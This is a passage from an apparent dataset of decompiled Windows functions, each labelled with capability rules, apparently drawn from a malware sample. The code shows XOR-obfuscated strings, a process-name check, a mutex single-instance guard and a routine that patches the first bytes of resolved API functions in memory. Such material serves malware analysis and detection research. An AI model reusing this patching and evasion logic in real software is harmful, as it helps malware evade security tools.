var_2fh = 0x4a;\n                        var_2eh = 0x51;\n                        var_2dh = 0x34;\n                        var_2ch = 0;\n                        var_2bh = 0x32;\n                        var_2ah = 0x3c;\n                        var_29h = 0x4a;\n                        var_28h = 0x34;\n                        var_27h = 0x34;\n                        var_24h[0] = 0x34;\n                        var_24h[1] = 0x34;\n                        var_24h[2] = 0x78;\n                        var_24h[3] = 0x32;\n                        var_20h = 0x59;\n                        var_1fh = 0x4a;\n                        fcn.004012a0(0x34);\n                        for (var_4h = 0; var_4h < 0x1a; var_4h = var_4h + 1) {\n                            fcn.00401280(var_4h, var_40h[var_4h] ^ var_24h[var_4h % 6]);\n                        }\n                        uVar1 = fcn.00401270();\n                        uVar1 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(pszPath, uVar1);\n                        iVar2 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(uVar1);\n                        if (iVar2 == 0) {\n                            var_78h = 1;\n                        }\n                        fcn.004012d0();\n                    }\n                    iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)(hObject, &var_32ch);\n                } while (iVar2 != 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pszPath);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n        if (var_78h != 0) {\n            return;\n        }\n    }\n    var_70h._0_1_ = 0x36;\n    var_70h._1_1_ = 0x4a;\n    var_70h._2_1_ = 0x1d;\n    var_70h._3_1_ = 0x5a;\n    var_6ch = 1;\n    var_6bh = 0x65;\n    var_6ah = 0x3c;\n    var_69h = 0x78;\n    var_68h = 0x33;\n    var_67h = 0x73;\n    var_66h = 6;\n    var_65h = 0x4a;\n    var_64h = 0x1d;\n    var_63h = 0x5a;\n    var_62h = 0x36;\n    var_61h = 0x65;\n    var_60h = 0x24;\n    var_5fh = 0x78;\n    var_5eh = 0x2e;\n    var_5dh = 0x73;\n    var_5ch = 0x17;\n    var_5bh = 0x4a;\n    var_5ah = 1;\n    var_59h = 0x5a;\n    var_58h = 0x23;\n    var_57h = 0x65;\n    var_56h = 0x25;\n    var_55h = 0x78;\n    var_54h = 0x33;\n    var_53h = 0x73;\n    var_52h = 0xb;\n    var_51h = 0x4a;\n    var_50h = 0xc;\n    var_4fh = 0x5a;\n    var_4eh = 0x27;\n    var_4dh = 0x65;\n    var_4ch = 0x22;\n    var_4bh = 0x78;\n    var_4ah = 0x28;\n    var_49h = 0x73;\n    var_48h = 0;\n    var_47h = 0x4a;\n    var_46h = 0x19;\n    var_45h = 0x5a;\n    var_44h = 0x17;\n    var_43h = 0x65;\n    var_42h = 0x4a;\n    var_41h = 0x78;\n    var_1ch._0_1_ = 0x65;\n    var_1ch._1_1_ = 0x4a;\n    var_1ch._2_1_ = 0x78;\n    var_1ch._3_1_ = 0x5a;\n    var_18h = 0x73;\n    fcn.004012a0(0x60);\n    for (var_8h = 0; var_8h < 0x30; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_70h + var_8h) ^ *(&var_1ch + var_8h % 5));\n    }\n    uVar1 = fcn.00401270();\n    var_7ch = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, uVar1);\n    if (var_7ch == 0) {\n        uVar1 = fcn.00401270();\n        var_7ch = (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, uVar1);\n    }\n    else {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    }\n    fcn.004012d0();\n    return;\n}\n",
        "token_count": 2526
    },
    "00417be0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417be0(uint arg_8h, uint lpModuleName, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    uint lpflOldProtect;\n    uchar *var_8h;\n    uchar *lpAddress;\n    \n    lpflOldProtect = 0x20;\n    var_8h = NULL;\n    lpAddress = NULL;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, arg_10h);\n    lpAddress = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (lpAddress != NULL) {\n        var_8h = fcn.00416db0(arg_8h, arg_10h);\n        if (var_8h != NULL) {\n            (*_sym.imp.KERNEL32.dll_VirtualProtect)(lpAddress, 5, 0x40, &lpflOldProtect);\n            puVar3 = var_8h;\n            puVar4 = lpAddress;\n            for (iVar2 = 5; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualProtect)(lpAddress, 5, lpflOldProtect, &lpflOldProtect);\n        }\n    }\n    return;\n}\n",
        "token_count": 338
    },
    "00417c70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00417c70(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint var_3c4h;\n    uint var_3c0h;\n    uint var_3bch;\n    uint var_3b8h;\n    uint var_3b4h;\n    uint var_3b0h;\n    uint var_3ach;\n    uint var_3a8h;\n    uint var_3a4h;\n    uint var_3a0h;\n    uint var_39ch;\n    uint var_398h;\n    uint var_394h;\n    uint var_390h;\n    uint var_38ch;\n    uint var_388h;\n    uint var_384h;\n    uint var_380h;\n    uint var_37ch;\n    uint var_378h;\n    uint var_374h;\n    uint var_370h;\n    uint var_36ch;\n    uint var_368h;\n    uchar var_364h;\n    uchar var_363h;\n    uchar var_362h;\n    uchar var_361h;\n    uchar var_360h;\n    uchar var_35fh;\n    uchar var_35eh;\n    uchar var_35dh;\n    uchar var_35ch;\n    uchar var_35bh;\n    uchar var_35ah;\n    uchar var_359h;\n    uchar var_358h;\n    uchar var_357h;\n    uchar var_356h;\n    uchar var_355h;\n    uchar var_354h;\n    uchar var_353h;\n    uchar var_352h;\n    uchar var_351h;\n    uchar var_350h;\n    uchar var_34fh;\n    uchar var_34eh;\n    uchar var_34dh;\n    uchar var_34ch;\n    uchar var_34bh;\n    uchar var_34ah;\n    uchar var_349h;\n    uchar var_348h;\n    uchar var_347h;\n    uchar var_346h;\n    uchar var_345h;\n    uchar var_344h;\n    uchar var_343h;\n    uchar var_342h;\n    uchar var_341h;\n    uchar var_340h;\n    uchar var_33fh;\n    uchar var_33eh;\n    uchar var_33dh;\n    uchar var_33ch;\n    uchar var_33bh;\n    uchar var_33ah;\n    uchar var_339h;\n    uchar var_338h;\n    uchar var_337h;\n    uchar var_336h;\n    uchar var_335h;\n    uchar var_334h;\n    uchar var_333h;\n    uchar var_332h;\n    uchar var_331h;\n    uchar var_330h;\n    uchar var_32fh;\n    uchar var_32eh;\n    uchar var_32dh;\n    uchar var_32ch;\n    uchar var_32bh;\n    uchar var_32ah;\n    uchar var_329h;\n    uint8_t var_328h [4];\n    uchar var_324h;\n    uchar var_323h;\n    uchar var_322h;\n    uchar var_321h;\n    uchar var_320h;\n    uchar var_31fh;\n    uchar var_31eh;\n    uchar var_31dh;\n    uchar var_31ch;\n    uchar var_31bh;\n    uchar var_31ah;\n    uchar var_319h;\n    uchar var_318h;\n    uchar var_317h;\n    uchar var_316h;\n    uchar var_315h;\n    uchar var_314h;\n    uchar var_313h;\n    uchar var_312h;\n    uchar var_311h;\n    uchar var_310h;\n    uchar var_30fh;\n    uchar var_30eh;\n    uchar var_30dh;\n    uchar var_30ch;\n    uchar var_30bh;\n    uchar var_30ah;\n    uchar var_309h;\n    uchar var_308h;\n    uchar var_307h;\n    uchar var_306h;\n    uchar var_305h;\n    uchar var_304h;\n    uchar var_303h;\n    uchar var_302h;\n    uchar var_301h;\n    uchar var_300h;\n    uchar var_2ffh;\n    uchar var_2feh;\n    uchar var_2fdh;\n    uchar var_2fch;\n    uchar var_2fbh;\n    uchar var_2fah;\n    uchar var_2f9h;\n    uchar var_2f8h;\n    uchar var_2f7h;\n    uchar var_2f6h;\n    uchar var_2f5h;\n    uchar var_2f4h;\n    uchar var_2f3h;\n    uchar var_2f2h;\n    uchar var_2f1h;\n    uchar var_2f0h;\n    uchar var_2efh;\n    uchar var_2eeh;\n    uchar var_2edh;\n    uchar var_2ech;\n    uchar var_2ebh;\n    uchar var_2eah;\n    uchar var_2e9h;\n    uchar var_2e8h;\n    uchar var_2e7h;\n    uint8_t var_2e4h [4];\n    uchar var_2e0h;\n    uchar var_2dfh;\n    uchar var_2deh;\n    uchar var_2ddh;\n    uchar var_2dch;\n    uchar var_2dbh;\n    uchar var_2dah;\n    uchar var_2d9h;\n    uchar var_2d8h;\n    uchar var_2d7h;\n    uchar var_2d6h;\n    uchar var_2d5h;\n    uchar var_2d4h;\n    uchar var_2d3h;\n    uchar var_2d2h;\n    uchar var_2d1h;\n    uchar var_2d0h;\n    uchar var_2cfh;\n    uchar var_2ceh;\n    uchar var_2cdh;\n    uchar var_2cch;\n    uchar var_2cbh;\n    uchar var_2cah;\n    uchar var_2c9h;\n    uint8_t var_2c8h [4];\n    uchar var_2c4h;\n    uchar var_2c3h;\n    uchar var_2c2h;\n    uchar var_2c1h;\n    uchar var_2c0h;\n    uchar var_2bfh;\n    uchar var_2beh;\n    uchar var_2bdh;\n    uchar var_2bch;\n    uchar var_2bbh;\n    uchar var_2bah;\n    uchar var_2b9h;\n    uchar var_2b8h;\n    uchar var_2b7h;\n    uchar var_2b6h;\n    uchar var_2b5h;\n    uchar var_2b4h;\n    uchar var_2b3h;\n    uchar var_2b2h;\n    uchar var_2b1h;\n    uchar var_2b0h;\n    uchar var_2afh;\n    uint8_t var_2ach [4];\n    uchar var_2a8h;\n    uchar var_2a7h;\n    uchar var_2a6h;\n    uchar var_2a5h;\n    uchar var_2a4h;\n    uchar var_2a3h;\n    uchar var_2a2h;\n    uchar var_2a1h;\n    uchar var_2a0h;\n    uchar var_29fh;\n    uchar var_29eh;\n    uchar var_29dh;\n    uchar var_29ch;\n    uchar var_29bh;\n    uchar var_29ah;\n    uchar var_299h;\n    uchar var_298h;\n    uchar var_297h;\n    uchar var_296h;\n    uchar var_295h;\n    uchar var_294h;\n    uint var_290h;\n    uchar var_28ch;\n    uchar var_28bh;\n    uchar var_28ah;\n    uchar var_289h;\n    uchar var_288h;\n    uchar var_287h;\n    uchar var_286h;\n    uchar var_285h;\n    uchar var_284h;\n    uchar var_283h;\n    uchar var_282h;\n    uchar var_281h;\n    uchar var_280h;\n    uchar var_27fh;\n    uchar var_27eh;\n    uchar var_27dh;\n    uchar var_27ch;\n    uchar var_27bh;\n    uint var_278h;\n    uchar var_274h;\n    uchar var_273h;\n    uchar var_272h;\n    uchar var_271h;\n    uchar var_270h;\n    uchar var_26fh;\n    uchar var_26eh;\n    uchar var_26dh;\n    uchar var_26ch;\n    uchar var_26bh;\n    uchar var_26ah;\n    uchar var_269h;\n    uchar var_268h;\n    uchar var_267h;\n    uchar var_266h;\n    uchar var_265h;\n    uchar var_264h;\n    uint var_260h;\n    uchar var_25ch;\n    uchar var_25bh;\n    uchar var_25ah;\n    uchar var_259h;\n    uchar var_258h;\n    uchar var_257h;\n    uchar var_256h;\n    uchar var_255h;\n    uchar var_254h;\n    uchar var_253h;\n    uchar var_252h;\n    uchar var_251h;\n    uchar var_250h;\n    uchar var_24fh;\n    uchar var_24eh;\n    uchar var_24dh;\n    uint var_24ch;\n    uchar var_248h;\n    uchar var_247h;\n    uchar var_246h;\n    uchar var_245h;\n    uchar var_244h;\n    uchar var_243h;\n    uchar var_242h;\n    uchar var_241h;\n    uchar var_240h;\n    uchar var_23fh;\n    uchar var_23eh;\n    uchar var_23dh;\n    uchar var_23ch;\n    uchar var_23bh;\n    uchar var_23ah;\n    uchar var_239h;\n    uint var_238h;\n    uchar var_234h;\n    uchar var_233h;\n    uchar var_232h;\n    uchar var_231h;\n    uchar var_230h;\n    uchar var_22fh;\n    uchar var_22eh;\n    uchar var_22dh;\n    uchar var_22ch;\n    uchar var_22bh;\n    uchar var_22ah;\n    uchar var_229h;\n    uchar var_228h;\n    uchar var_227h;\n    uchar var_226h;\n    uint var_224h;\n    uchar var_220h;\n    uchar var_21fh;\n    uchar var_21eh;\n    uchar var_21dh;\n    uchar var_21ch;\n    uchar var_21bh;\n    uchar var_21ah;\n    uchar var_219h;\n    uchar var_218h;\n    uchar var_217h;\n    uchar var_216h;\n    uchar var_215h;\n    uchar var_214h;\n    uchar var_213h;\n    uint var_210h;\n    uchar var_20ch;\n    uchar var_20bh;\n    uchar var_20ah;\n    uchar var_209h;\n    uchar var_208h;\n    uchar var_207h;\n    uchar var_206h;\n    uchar var_205h;\n    uchar var_204h;\n    uchar var_203h;\n    uchar var_202h;\n    uchar var_201h;\n    uchar var_200h;\n    uchar var_1ffh;\n    uint8_t var_1fch [4];\n    uchar var_1f8h;\n    uchar var_1f7h;\n    uchar var_1f6h;\n    uchar var_1f5h;\n    uchar var_1f4h;\n    uchar var_1f3h;\n    uchar var_1f2h;\n    uchar var_1f1h;\n    uchar var_1f0h;\n    uchar var_1efh;\n    uchar var_1eeh;\n    uchar var_1edh;\n    uchar var_1ech;\n    uchar var_1ebh;\n    uint8_t var_1e8h [4];\n    uchar var_1e4h;\n    uchar var_1e3h;\n    uchar var_1e2h;\n    uchar var_1e1h;\n    uchar var_1e0h;\n    uchar var_1dfh;\n    uchar var_1deh;\n    uchar var_1ddh;\n    uchar var_1dch;\n    uchar var_1dbh;\n    uchar var_1dah;\n    uchar var_1d9h;\n    uint var_1d8h;\n    uchar var_1d4h;\n    uchar var_1d3h;\n    uchar var_1d2h;\n    uchar var_1d1h;\n    uchar var_1d0h;\n    uchar var_1cfh;\n    uchar var_1ceh;\n    uchar var_1cdh;\n    uchar var_1cch;\n    uchar var_1cbh;\n    uchar var_1cah;\n    uint var_1c8h;\n    uchar var_1c4h;\n    uchar var_1c3h;\n    uchar var_1c2h;\n    uchar var_1c1h;\n    uchar var_1c0h;\n    uchar var_1bfh;\n    uchar var_1beh;\n    uchar var_1bdh;\n    uchar var_1bch;\n    uchar var_1bbh;\n    uchar var_1bah;\n    uint8_t var_1b8h [4];\n    uchar var_1b4h;\n    uchar var_1b3h;\n    uchar var_1b2h;\n    uchar var_1b1h;\n    uchar var_1b0h;\n    uchar var_1afh;\n    uchar var_1aeh;\n    uchar var_1adh;\n    uchar var_1ach;\n    uchar var_1abh;\n    uint8_t var_1a8h [4];\n    uchar var_1a4h;\n    uchar var_1a3h;\n    uchar var_1a2h;\n    uchar var_1a1h;\n    uchar var_1a0h;\n    uchar var_19fh;\n    uchar var_19eh;\n    uchar var_19dh;\n    uchar var_19ch;\n    uint var_198h;\n    uchar var_194h;\n    uchar var_193h;\n    uchar var_192h;\n    uchar var_191h;\n    uchar var_190h;\n    uchar var_18fh;\n    uchar var_18eh;\n    uchar var_18dh;\n    uint var_18ch;\n    uchar var_188h;\n    uchar var_187h;\n    uchar var_186h;\n    uchar var_185h;\n    uchar var_184h;\n    uchar var_183h;\n    uchar var_182h;\n    uchar var_181h;\n    uint var_180h;\n    uchar var_17ch;\n    uchar var_17bh;\n    uchar var_17ah;\n    uchar var_179h;\n    uchar var_178h;\n    uchar var_177h;\n    uchar var_176h;\n    uint8_t var_174h [4];\n    uchar var_170h;\n    uchar var_16fh;\n    uchar var_16eh;\n    uchar var_16dh;\n    uchar var_16ch;\n    uchar var_16bh;\n    uchar var_16ah;\n    uint var_168h;\n    uchar var_164h;\n    uchar var_163h;\n    uchar var_162h;\n    uchar var_161h;\n    uchar var_160h;\n    uchar var_15fh;\n    uchar var_15eh;\n    uint var_15ch;\n    uchar var_158h;\n    uchar var_157h;\n    uchar var_156h;\n    uchar var_155h;\n    uchar var_154h;\n    uchar var_153h;\n    uint var_150h;\n    uchar var_14ch;\n    uchar var_14bh;\n    uchar var_14ah;\n    uchar var_149h;\n    uchar var_148h;\n    uchar var_147h;\n    uint var_144h;\n    uchar var_140h;\n    uchar var_13fh;\n    uint8_t var_13ch [4];\n    uchar var_138h;\n    uchar var_137h;\n    uint var_134h;\n    uchar var_130h;\n    uchar var_12fh;\n    uint var_12ch;\n    uchar var_128h;\n    uchar var_127h;\n    uint var_124h;\n    uchar var_120h;\n    uchar var_11fh;\n    uint var_11ch;\n    uchar var_118h;\n    uchar var_117h;\n    uint8_t var_114h [4];\n    uchar var_110h;\n    uchar var_10fh;\n    uint8_t var_10ch [4];\n    uchar var_108h;\n    uchar var_107h;\n    uint8_t var_104h [4];\n    uchar var_100h;\n    uchar var_ffh [3];\n    uint var_fch;\n    uchar var_f8h;\n    uchar var_f7h;\n    uint8_t var_f4h [4];\n    uchar var_f0h;\n    uchar var_efh;\n    uint8_t var_ech [4];\n    uchar var_e8h;\n    uchar var_e7h;\n    uint var_e4h;\n    uchar var_e0h;\n    uint var_dch;\n    uchar var_d8h;\n    uint var_d4h;\n    uchar var_d0h;\n    uint var_cch;\n    uchar var_c8h;\n    uint var_c4h;\n    uchar var_c0h;\n    uint var_bch;\n    uchar var_b8h;\n    uint var_b4h;\n    uchar var_b0h;\n    uint var_ach;\n    uchar var_a8h;\n    uint var_a4h;\n    uchar var_a0h;\n    uint var_9ch;\n    uchar var_98h;\n    uint var_94h;\n    uchar var_90h;\n    uint var_8ch;\n    uchar var_88h;\n    uint var_84h;\n    uchar var_80h;\n    uint var_7ch;\n    uint dwSize;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint lpAddress;\n    \n    lpAddress = 0;\n    var_ch = 0;\n    var_74h = 0;\n    dwSize = 0;\n    var_368h._0_1_ = 0x77;\n    var_368h._1_1_ = 0x6c;\n    var_368h._2_1_ = 0x21;\n    var_368h._3_1_ = 0x53;\n    var_364h = 0x34;\n    var_363h = 0x6d;\n    var_362h = 0x21;\n    var_361h = 0x6c;\n    var_360h = 6;\n    var_35fh = 0x53;\n    var_35eh = 0x28;\n    var_35dh = 0x6d;\n    var_35ch = 0x3f;\n    var_35bh = 0x6c;\n    var_35ah = 0x20;\n    var_359h = 0x53;\n    var_358h = 0x22;\n    var_357h = 0x6d;\n    var_356h = 0x3d;\n    var_355h = 0x6c;\n    var_354h = 6;\n    var_353h = 0x53;\n    var_352h = 0x68;\n    var_351h = 0x6d;\n    var_350h = 0xe;\n    var_34fh = 0x6c;\n    var_34eh = 0x21;\n    var_34dh = 0x53;\n    var_34ch = 0x34;\n    var_34bh = 0x6d;\n    var_34ah = 0x21;\n    var_349h = 0x6c;\n    var_348h = 6;\n    var_347h = 0x53;\n    var_346h = 0x28;\n    var_345h = 0x6d;\n    var_344h = 0x3f;\n    var_343h = 0x6c;\n    var_342h = 0x41;\n    var_341h = 0x53;\n    var_340h = 0x7f;\n    var_33fh = 0x6d;\n    var_33eh = 0xe;\n    var_33dh = 0x6c;\n    var_33ch = 0x1c;\n    var_33bh = 0x53;\n    var_33ah = 0x39;\n    var_339h = 0x6d;\n    var_338h = 0x36;\n    var_337h = 0x6c;\n    var_336h = 0x1e;\n    var_335h = 0x53;\n    var_334h = 0x21;\n    var_333h = 0x6d;\n    var_332h = 0x7c;\n    var_331h = 0x6c;\n    var_330h = 0x16;\n    var_32fh = 0x53;\n    var_32eh = 0x21;\n    var_32dh = 0x6d;\n    var_32ch = 0x3e;\n    var_32bh = 0x6c;\n    var_32ah = 0x72;\n    var_329h = 0x53;\n    var_11ch._0_1_ = 0x52;\n    var_11ch._1_1_ = 0x6c;\n    var_11ch._2_1_ = 0x72;\n    var_11ch._3_1_ = 0x53;\n    var_118h = 0x4d;\n    var_117h = 0x6d;\n    fcn.004012a0(0x80);\n    for (var_10h = 0; var_10h < 0x40; var_10h = var_10h + 1) {\n        fcn.00401280(var_10h, *(&var_368h + var_10h) ^ *(&var_11ch + var_10h % 6));\n    }\n    puVar5 = &var_74h;\n    puVar4 = &var_ch;\n    uVar1 = fcn.00401270();\n    iVar2 = fcn.004162b0(uVar1, puVar4, puVar5);\n    if (((iVar2 == 0) && (var_ch != 0)) && (var_74h != 0)) {\n        iVar2 = fcn.004171d0(var_ch, 0, 1, &lpAddress, &dwSize);\n        if (iVar2 != 0) {\n            var_150h._0_1_ = 0x27;\n            var_150h._1_1_ = 0x1f;\n            var_150h._2_1_ = 5;\n            var_150h._3_1_ = 1;\n            var_14ch = 0x3d;\n            var_14bh = 0x67;\n            var_14ah = 0xf;\n            var_149h = 0xd;\n            var_148h = 1;\n            var_147h = 0x51;\n            var_8ch._0_1_ = 0x49;\n            var_8ch._1_1_ = 0x6b;\n            var_8ch._2_1_ = 0x61;\n            var_8ch._3_1_ = 0x6d;\n            var_88h = 0x51;\n            fcn.004012a0(10);\n            for (var_14h = 0; var_14h < 10; var_14h = var_14h + 1) {\n                fcn.00401280(var_14h, *(&var_150h + var_14h) ^ *(&var_8ch + var_14h % 5));\n            }\n            var_278h._0_1_ = 0x2b;\n            var_278h._1_1_ = 0x41;\n            var_278h._2_1_ = 0x6e;\n            var_278h._3_1_ = 0x35;\n            var_274h = 0x50;\n            var_273h = 0x11;\n            var_272h = 0x50;\n            var_271h = 0x6f;\n            var_270h = 0x2e;\n            var_26fh = 0x4b;\n            var_26eh = 0x11;\n            var_26dh = 0x40;\n            var_26ch = 0x58;\n            var_26bh = 0x2b;\n            var_26ah = 0x74;\n            var_269h = 0;\n            var_268h = 0x58;\n            var_267h = 0x56;\n            var_266h = 0x35;\n            var_265h = 0x40;\n            var_264h = 0x65;\n            var_84h._0_1_ = 0x65;\n            var_84h._1_1_ = 0x35;\n            var_84h._2_1_ = 0x39;\n            var_84h._3_1_ = 0x47;\n            var_80h = 0x39;\n            fcn.004012a0(0x15);\n            for (var_18h = 0; var_18h < 0x15; var_18h = var_18h + 1) {\n                fcn.00401280(var_18h, *(&var_278h + var_18h) ^ *(&var_84h + var_18h % 5));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_238h._0_1_ = 0x7f;\n            var_238h._1_1_ = 0x18;\n            var_238h._2_1_ = 4;\n            var_238h._3_1_ = 0x37;\n            var_234h = 0x46;\n            var_233h = 0x67;\n            var_232h = 5;\n            var_231h = 0x2c;\n            var_230h = 0x21;\n            var_22fh = 0x79;\n            var_22eh = 0x57;\n            var_22dh = 0x3f;\n            var_22ch = 0x2c;\n            var_22bh = 0x35;\n            var_22ah = 0x42;\n            var_229h = 0x58;\n            var_228h = 3;\n            var_227h = 0x27;\n            var_226h = 0x56;\n            var_e4h._0_1_ = 0x31;\n            var_e4h._1_1_ = 0x6c;\n            var_e4h._2_1_ = 0x49;\n            var_e4h._3_1_ = 0x56;\n            var_e0h = 0x36;\n            fcn.004012a0(0x13);\n            for (var_1ch = 0; var_1ch < 0x13; var_1ch = var_1ch + 1) {\n                fcn.00401280(var_1ch, *(&var_238h + var_1ch) ^ *(&var_e4h + var_1ch % 5));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_1c8h._0_1_ = 0x7f;\n            var_1c8h._1_1_ = 0x46;\n            var_1c8h._2_1_ = 0x18;\n            var_1c8h._3_1_ = 0x30;\n            var_1c4h = 0x39;\n            var_1c3h = 0x44;\n            var_1c2h = 0x5f;\n            var_1c1h = 0x2f;\n            var_1c0h = 1;\n            var_1bfh = 0x22;\n            var_1beh = 0x43;\n            var_1bdh = 0x57;\n            var_1bch = 0x2b;\n            var_1bbh = 0x31;\n            var_1bah = 0x4a;\n            var_dch._0_1_ = 0x31;\n            var_dch._1_1_ = 0x32;\n            var_dch._2_1_ = 0x4a;\n            var_dch._3_1_ = 0x55;\n            var_d8h = 0x4a;\n            fcn.004012a0(0xf);\n            for (var_20h = 0; var_20h < 0xf; var_20h = var_20h + 1) {\n                fcn.00401280(var_20h, *(&var_1c8h + var_20h) ^ *(&var_dch + var_20h % 5));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_1b8h[0] = 0x2b;\n            var_1b8h[1] = 0x41;\n            var_1b8h[2] = 0x72;\n            var_1b8h[3] = 0x21;\n            var_1b4h = 0x3c;\n            var_1b3h = 0x38;\n            var_1b2h = 0x11;\n            var_1b1h = 0x50;\n            var_1b0h = 0x74;\n            var_1afh = 0x25;\n            var_1aeh = 0x3c;\n            var_1adh = 0x37;\n            var_1ach = 0x11;\n            var_1abh = 0x35;\n            var_114h[0] = 0x65;\n            var_114h[1] = 0x35;\n            var_114h[2] = 0x31;\n            var_114h[3] = 0x53;\n            var_110h = 0x59;\n            var_10fh = 0x59;\n            fcn.004012a0(0xe);\n            for (var_24h = 0; var_24h < 0xe; var_24h = var_24h + 1) {\n                fcn.00401280(var_24h, var_1b8h[var_24h] ^ var_114h[var_24h % 6]);\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_1d8h._0_1_ = 0x3a;\n            var_1d8h._1_1_ = 0x3b;\n            var_1d8h._2_1_ = 8;\n            var_1d8h._3_1_ = 0x17;\n            var_1d4h = 0x14;\n            var_1d3h = 0x59;\n            var_1d2h = 0;\n            var_1d1h = 0x2a;\n            var_1d0h = 6;\n            var_1cfh = 0x10;\n            var_1ceh = 5;\n            var_1cdh = 0x59;\n            var_1cch = 0x1a;\n            var_1cbh = 0x3b;\n            var_1cah = 0x4b;\n            var_10ch[0] = 0x74;\n            var_10ch[1] = 0x4f;\n            var_10ch[2] = 0x4b;\n            var_10ch[3] = 0x65;\n            var_108h = 0x71;\n            var_107h = 0x38;\n            fcn.004012a0(0xf);\n            for (var_28h = 0; var_28h < 0xf; var_28h = var_28h + 1) {\n                fcn.00401280(var_28h, *(&var_1d8h + var_28h) ^ var_10ch[var_28h % 6]);\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_1fch[0] = 6;\n            var_1fch[1] = 2;\n            var_1fch[2] = 0x30;\n            var_1fch[3] = 0x28;\n            var_1f8h = 0x32;\n            var_1f7h = 0;\n            var_1f6h = 0x3c;\n            var_1f5h = 0x13;\n            var_1f4h = 0x20;\n            var_1f3h = 0x3f;\n            var_1f2h = 0x3a;\n            var_1f1h = 0;\n            var_1f0h = 0x38;\n            var_1efh = 0x1e;\n            var_1eeh = 0x1c;\n            var_1edh = 0x28;\n            var_1ech = 0x32;\n            var_1ebh = 0x61;\n            var_fch._0_1_ = 0x48;\n            var_fch._1_1_ = 0x76;\n            var_fch._2_1_ = 0x73;\n            var_fch._3_1_ = 0x5a;\n            var_f8h = 0x57;\n            var_f7h = 0x61;\n            fcn.004012a0(0x12);\n            for (var_2ch = 0; var_2ch < 0x12; var_2ch = var_2ch + 1) {\n                fcn.00401280(var_2ch, var_1fch[var_2ch] ^ *(&var_fch + var_2ch % 6));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_24ch._0_1_ = 0x16;\n            var_24ch._1_1_ = 0x15;\n            var_24ch._2_1_ = 0x2f;\n            var_24ch._3_1_ = 0x3d;\n            var_248h = 0;\n            var_247h = 0x39;\n            var_246h = 0x15;\n            var_245h = 9;\n            var_244h = 0x1a;\n            var_243h = 0x16;\n            var_242h = 0x3d;\n            var_241h = 0x13;\n            var_240h = 0x3c;\n            var_23fh = 0x3d;\n            var_23eh = 10;\n            var_23dh = 0x3b;\n            var_23ch = 4;\n            var_23bh = 0x1f;\n            var_23ah = 0x3c;\n            var_239h = 0x65;\n            var_d4h._0_1_ = 0x58;\n            var_d4h._1_1_ = 0x61;\n            var_d4h._2_1_ = 0x6c;\n            var_d4h._3_1_ = 0x4f;\n            var_d0h = 0x65;\n            fcn.004012a0(0x14);\n            for (var_30h = 0; var_30h < 0x14; var_30h = var_30h + 1) {\n                fcn.00401280(var_30h, *(&var_24ch + var_30h) ^ *(&var_d4h + var_30h % 5));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_18ch._0_1_ = 0x25;\n            var_18ch._1_1_ = 0x3d;\n            var_18ch._2_1_ = 0x76;\n            var_18ch._3_1_ = 0x35;\n            var_188h = 0x51;\n            var_187h = 8;\n            var_186h = 0x2e;\n            var_185h = 0x3f;\n            var_184h = 